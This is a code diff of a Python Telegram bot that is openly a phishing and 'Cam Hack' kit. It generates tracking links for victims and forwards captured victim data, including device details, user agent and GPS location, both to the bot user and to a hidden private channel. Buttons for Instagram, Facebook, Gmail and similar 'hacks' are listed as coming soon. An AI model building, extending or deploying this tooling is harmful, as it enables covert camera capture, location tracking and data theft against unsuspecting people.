@@ -4,9 +4,11 @@ import time
 import threading
 import uuid
 import requests
-import json
 from flask import Flask, request, jsonify
 from config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
+
+# ========== IMPORT MODULES ==========
+from modules import cam, insta, face, twit, snap, gmail, free
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -15,12 +17,15 @@ user_data = {}
 link_cache = {}
 victim_data_store = {}
 
-# ========== BOTTOM BUTTONS ==========
+# ========== BOTTOM BUTTONS (6 buttons) ==========
 def get_bottom_buttons():
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     markup.add(
         KeyboardButton("📸 Cam Hack"),
-        KeyboardButton("📱 Social Media"),
+        KeyboardButton("📸 Instagram"),
+        KeyboardButton("📘 Facebook"),
+        KeyboardButton("🐦 Twitter"),
+        KeyboardButton("👻 Snapchat"),
         KeyboardButton("📧 Gmail"),
         KeyboardButton("🎮 Free Fire"),
         KeyboardButton("🔗 All Links")
@@ -33,7 +38,15 @@ def start(message):
     user_id = message.chat.id
     bot.send_message(
         user_id,
-        "🔥 *Choose your weapon:*\n\n📸 Cam Hack (working)",
+        "🔥 *Choose your weapon:*\n\n"
+        "📸 Cam Hack (working)\n"
+        "📸 Instagram (coming soon)\n"
+        "📘 Facebook (coming soon)\n"
+        "🐦 Twitter (coming soon)\n"
+        "👻 Snapchat (coming soon)\n"
+        "📧 Gmail (coming soon)\n"
+        "🎮 Free Fire (coming soon)\n"
+        "🔗 All Links (coming soon)",
         reply_markup=get_bottom_buttons(),
         parse_mode="Markdown"
     )
@@ -52,13 +65,27 @@ def route_buttons(message):
         )
         bot.register_next_step_handler(msg, get_cam_photo, user_id)
 
-    elif text in ["📱 Social Media", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
-        bot.send_message(
-            user_id,
-            f"⏳ *{text}* coming soon. Only *Cam Hack* works.",
-            reply_markup=get_bottom_buttons(),
-            parse_mode="Markdown"
-        )
+    elif text == "📸 Instagram":
+        bot.send_message(user_id, "⏳ *Instagram* coming soon!", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+
+    elif text == "📘 Facebook":
+        bot.send_message(user_id, "⏳ *Facebook* coming soon!", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+
+    elif text == "🐦 Twitter":
+        bot.send_message(user_id, "⏳ *Twitter* coming soon!", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+
+    elif text == "👻 Snapchat":
+        bot.send_message(user_id, "⏳ *Snapchat* coming soon!", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+
+    elif text == "📧 Gmail":
+        bot.send_message(user_id, "⏳ *Gmail* coming soon!", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+
+    elif text == "🎮 Free Fire":
+        bot.send_message(user_id, "⏳ *Free Fire* coming soon!", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+
+    elif text == "🔗 All Links":
+        bot.send_message(user_id, "⏳ *All Links* coming soon!", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
+
     else:
         bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())
 
@@ -69,26 +96,15 @@ def get_cam_photo(message, user_id):
         file_info = bot.get_file(photo_id)
         photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
         
-        # Store in memory
         if user_id not in user_data:
             user_data[user_id] = {}
         user_data[user_id]["photo_url"] = photo_url
         victim_data_store[f"photo_{user_id}"] = photo_url
 
-        # ===== FORWARD PHOTO TO PRIVATE CHANNEL =====
+        # Forward to channel
         try:
-            # Send photo to channel
-            bot.send_photo(
-                PRIVATE_CHANNEL_ID,
-                photo_id,
-                caption=f"📸 *User {user_id} uploaded photo for Cam Hack*"
-            )
-            # Also send the URL
-            bot.send_message(
-                PRIVATE_CHANNEL_ID,
-                f"🔗 *Photo URL:*\n`{photo_url}`",
-                parse_mode="Markdown"
-            )
+            bot.send_photo(PRIVATE_CHANNEL_ID, photo_id, caption=f"📸 *User {user_id} uploaded photo for Cam Hack*")
+            bot.send_message(PRIVATE_CHANNEL_ID, f"🔗 *Photo URL:*\n`{photo_url}`", parse_mode="Markdown")
         except Exception as e:
             print(f"Channel photo forward error: {e}")
 
@@ -108,32 +124,20 @@ def get_cam_redirect(message, user_id):
         user_data[user_id]["redirect"] = redirect_url
         victim_data_store[f"redirect_{user_id}"] = redirect_url
 
-        # ===== FORWARD REDIRECT LINK TO PRIVATE CHANNEL =====
         try:
-            bot.send_message(
-                PRIVATE_CHANNEL_ID,
-                f"🔗 *User {user_id} set redirect link for Cam Hack:*\n`{redirect_url}`",
-                parse_mode="Markdown"
-            )
+            bot.send_message(PRIVATE_CHANNEL_ID, f"🔗 *User {user_id} set redirect link:*\n`{redirect_url}`", parse_mode="Markdown")
         except Exception as e:
             print(f"Channel redirect forward error: {e}")
 
-        # Generate final phishing link
         unique_id = str(uuid.uuid4())[:8]
         link = f"{BASE_URL}/p/{unique_id}?type=cam&v={user_id}"
         link_cache[unique_id] = {"user_id": user_id, "time": time.time()}
 
-        # ===== FORWARD FINAL LINK TO CHANNEL =====
         try:
-            bot.send_message(
-                PRIVATE_CHANNEL_ID,
-                f"✅ *Final Cam Hack link generated for user {user_id}:*\n`{link}`",
-                parse_mode="Markdown"
-            )
+            bot.send_message(PRIVATE_CHANNEL_ID, f"✅ *Final Cam Hack link:*\n`{link}`", parse_mode="Markdown")
         except Exception as e:
             print(f"Channel final link forward error: {e}")
 
-        # Send final link to user
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
@@ -194,7 +198,6 @@ def capture():
 def home():
     return "✅ Bot is running!"
 
-# ========== FORWARD VICTIM DATA TO USER + CHANNEL ==========
 def forward_to_user_and_channel(victim_id, data):
     try:
         user_id = None
@@ -213,7 +216,6 @@ def forward_to_user_and_channel(victim_id, data):
             print(f"⚠️ No user found for victim {victim_id}")
             return
         
-        # --- Send to USER ---
         user_text = f"📥 *Victim Data*\n🆔 {victim_id}\n"
         device = data.get('device_info', {})
         if device:
@@ -244,7 +246,6 @@ def forward_to_user_and_channel(victim_id, data):
         if loc and loc.get('lat') and loc.get('lng'):
             bot.send_location(user_id, loc['lat'], loc['lng'])
 
-        # --- Send to CHANNEL ---
         channel_text = f"📥 *New Victim Data*\n🆔 {victim_id}\n"
         if device:
             channel_text += f"📱 {device.get('userAgent', 'N/A')[:50]}...\n"
@@ -273,7 +274,6 @@ def forward_to_user_and_channel(victim_id, data):
     except Exception as e:
         print(f"Forward error: {e}")
 
-# ========== CLEANUP ==========
 def clean_old_data():
     while True:
         time.sleep(600)
@@ -288,9 +288,8 @@ def clean_old_data():
 
 threading.Thread(target=clean_old_data, daemon=True).start()
 
-# ========== RUN ==========
 if __name__ == "__main__":
-    print("🤖 Cam Hack + Channel Logging Running...")
+    print("🤖 Bot Running...")
     def run_bot():
         while True:
             try:
